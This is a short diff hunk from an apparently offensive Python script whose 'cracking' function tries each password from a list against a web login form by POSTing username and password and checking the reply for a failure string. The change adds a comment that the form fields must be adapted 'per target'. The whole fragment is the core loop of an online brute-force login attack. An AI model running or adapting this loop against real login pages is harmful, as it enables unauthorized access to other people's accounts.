@@ -11,7 +11,7 @@ def cracking(username, url)
     for password in passwords:
         password = password.strip()
         print('Trying: ' + password)
-        data = {'username':username,'password':password,'Login':'submit'}
+        data = {'username':username,'password':password,'Login':'submit'}  #fields & request.get require modification per target
         response = requests.post(url, data=data)
         if login_failed_string in response.content.decode():
             pass
